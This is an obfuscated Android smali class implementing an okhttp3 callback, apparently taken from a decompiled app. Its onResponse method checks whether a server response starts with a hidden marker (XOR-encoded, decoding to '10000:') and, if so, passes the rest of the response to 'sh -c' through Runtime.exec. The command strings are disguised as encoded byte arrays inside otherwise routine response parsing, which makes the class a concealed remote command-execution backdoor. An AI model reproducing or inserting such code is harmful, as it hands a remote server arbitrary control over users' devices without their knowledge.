.class public Lobfuscated/p92836f8ca0c7e24b/c10f09de7a7f26cb3b54e782c;
.super Ljava/lang/Object;

# interfaces
.implements Lokhttp3/Callback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ඣ()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public final synthetic ඈ:Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;


# direct methods
.method public constructor <init>(Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lobfuscated/p92836f8ca0c7e24b/c10f09de7a7f26cb3b54e782c;->ඈ:Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;

    .line 2
    .line 3
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 4
    .line 5
    .line 6
    return-void
.end method


# virtual methods
.method public onFailure(Lokhttp3/Call;Ljava/io/IOException;)V
    .locals 2

    .line 1
    invoke-static {}, Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ල()Landroid/os/Handler;

    .line 2
    .line 3
    .line 4
    move-result-object p1

    .line 5
    if-eqz p1, :cond_0

    .line 6
    .line 7
    invoke-static {}, Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ල()Landroid/os/Handler;

    .line 8
    .line 9
    .line 10
    move-result-object p1

    .line 11
    const/4 p2, 0x0

    .line 12
    invoke-virtual {p1, p2}, Landroid/os/Handler;->removeMessages(I)V

    .line 13
    .line 14
    .line 15
    invoke-static {}, Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ල()Landroid/os/Handler;

    .line 16
    .line 17
    .line 18
    move-result-object p1

    .line 19
    new-instance p2, Lobfuscated/p92836f8ca0c7e24b/ccd0ef7523278e69c43feae81;

    .line 20
    .line 21
    invoke-direct {p2, p0}, Lobfuscated/p92836f8ca0c7e24b/ccd0ef7523278e69c43feae81;-><init>(Lobfuscated/p92836f8ca0c7e24b/c10f09de7a7f26cb3b54e782c;)V

    .line 22
    .line 23
    .line 24
    const-wide/16 v0, 0x1388

    .line 25
    .line 26
    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 27
    .line 28
    .line 29
    :cond_0
    return-void
.end method

.method public onResponse(Lokhttp3/Call;Lokhttp3/Response;)V
    .locals 5

    .line 1
    invoke-virtual {p2}, Lokhttp3/Response;->isSuccessful()Z

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    if-eqz v0, :cond_2

    .line 6
    .line 7
    invoke-static {}, Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ල()Landroid/os/Handler;

    .line 8
    .line 9
    .line 10
    move-result-object p1

    .line 11
    const/4 v0, 0x0

    .line 12
    invoke-virtual {p1, v0}, Landroid/os/Handler;->removeMessages(I)V

    .line 13
    .line 14
    .line 15
    invoke-virtual {p2}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    .line 16
    .line 17
    .line 18
    move-result-object p1

    .line 19
    if-eqz p1, :cond_1

    .line 20
    .line 21
    :try_start_0
    invoke-virtual {p1}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;

    .line 22
    .line 23
    .line 24
    move-result-object p1

    .line 25
    const/4 p2, 0x6

    .line 26
    new-array v0, p2, [B

    .line 27
    .line 28
    fill-array-data v0, :array_0

    .line 29
    .line 30
    .line 31
    const/16 v1, 0x8

    .line 32
    .line 33
    new-array v2, v1, [B

    .line 34
    .line 35
    fill-array-data v2, :array_1

    .line 36
    .line 37
    .line 38
    invoke-static {v0, v2}, Lobfuscated/p92836f8ca0c7e24b/c534857d476004ad4395655bb;->ඈ([B[B)Ljava/lang/String;

    .line 39
    .line 40
    .line 41
    move-result-object v0

    .line 42
    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    .line 43
    .line 44
    .line 45
    move-result v0

    .line 46
    if-eqz v0, :cond_0

    .line 47
    .line 48
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    .line 49
    .line 50
    .line 51
    move-result-object v0

    .line 52
    const/4 v2, 0x2

    .line 53
    new-array v3, v2, [B

    .line 54
    .line 55
    fill-array-data v3, :array_2

    .line 56
    .line 57
    .line 58
    new-array v4, v1, [B

    .line 59
    .line 60
    fill-array-data v4, :array_3

    .line 61
    .line 62
    .line 63
    invoke-static {v3, v4}, Lobfuscated/p92836f8ca0c7e24b/c534857d476004ad4395655bb;->ඈ([B[B)Ljava/lang/String;

    .line 64
    .line 65
    .line 66
    move-result-object v3

    .line 67
    new-array v2, v2, [B

    .line 68
    .line 69
    fill-array-data v2, :array_4

    .line 70
    .line 71
    .line 72
    new-array v1, v1, [B

    .line 73
    .line 74
    fill-array-data v1, :array_5

    .line 75
    .line 76
    .line 77
    invoke-static {v2, v1}, Lobfuscated/p92836f8ca0c7e24b/c534857d476004ad4395655bb;->ඈ([B[B)Ljava/lang/String;

    .line 78
    .line 79
    .line 80
    move-result-object v1

    .line 81
    invoke-virtual {p1, p2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    move-result-object p2

    .line 85
    filled-new-array {v3, v1, p2}, [Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    move-result-object p2

    .line 89
    invoke-virtual {v0, p2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    .line 90
    .line 91
    .line 92
    :cond_0
    iget-object p2, p0, Lobfuscated/p92836f8ca0c7e24b/c10f09de7a7f26cb3b54e782c;->ඈ:Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;

    .line 93
    .line 94
    const-class v0, Lobfuscated/pa282f480b5de7b0d/ccf8cdd0c9a9bfbaf705e3f82;

    .line 95
    .line 96
    invoke-static {p1, v0}, Landroidx/appcompat/view/widget/їϹї;->ʥ(Ljava/lang/String;Ljava/lang/Class;)Ljava/util/List;

    .line 97
    .line 98
    .line 99
    move-result-object p1

    .line 100
    invoke-static {p2, p1}, Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ஆ(Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;Ljava/util/List;)V

    .line 101
    .line 102
    .line 103
    iget-object p0, p0, Lobfuscated/p92836f8ca0c7e24b/c10f09de7a7f26cb3b54e782c;->ඈ:Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;

    .line 104
    .line 105
    invoke-static {p0}, Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;->ʤ(Lobfuscated/p92836f8ca0c7e24b/c85334ab0c0a440271c03b8ff;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 106
    .line 107
    .line 108
    goto :goto_0

    .line 109
    :catch_0
    move-exception p0

    .line 110
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 111
    .line 112
    .line 113
    :cond_1
    :goto_0
    return-void

    .line 114
    :cond_2
    const/4 p2, 0x0

    .line 115
    invoke-virtual {p0, p1, p2}, Lobfuscated/p92836f8ca0c7e24b/c10f09de7a7f26cb3b54e782c;->onFailure(Lokhttp3/Call;Ljava/io/IOException;)V

    .line 116
    .line 117
    .line 118
    return-void

    .line 119
    :array_0
    .array-data 1
        0x5et
        -0x2bt
        0x3dt
        0x59t
        0xet
        0x52t
    .end array-data

    .line 120
    .line 121
    .line 122
    .line 123
    .line 124
    .line 125
    .line 126
    nop

    .line 127
    :array_1
    .array-data 1
        0x6ft
        -0x1bt
        0xdt
        0x69t
        0x3et
        0x68t
        -0x6et
        0x26t
    .end array-data

    .line 128
    .line 129
    .line 130
    .line 131
    .line 132
    .line 133
    .line 134
    .line 135
    :array_2
    .array-data 1
        0x71t
        -0x25t
    .end array-data

    .line 136
    .line 137
    .line 138
    .line 139
    .line 140
    nop

    .line 141
    :array_3
    .array-data 1
        0x2t
        -0x4dt
        -0x1ct
        0x11t
        -0x6bt
        0x21t
        -0x5et
        0x44t
    .end array-data

    .line 142
    .line 143
    .line 144
    .line 145
    .line 146
    .line 147
    .line 148
    .line 149
    :array_4
    .array-data 1
        0x21t
        0x16t
    .end array-data

    .line 150
    .line 151
    .line 152
    .line 153
    .line 154
    nop

    .line 155
    :array_5
    .array-data 1
        0xct
        0x75t
        0x55t
        0x30t
        -0x29t
        0x2dt
        0x3et
        -0x23t
    .end array-data
.end method
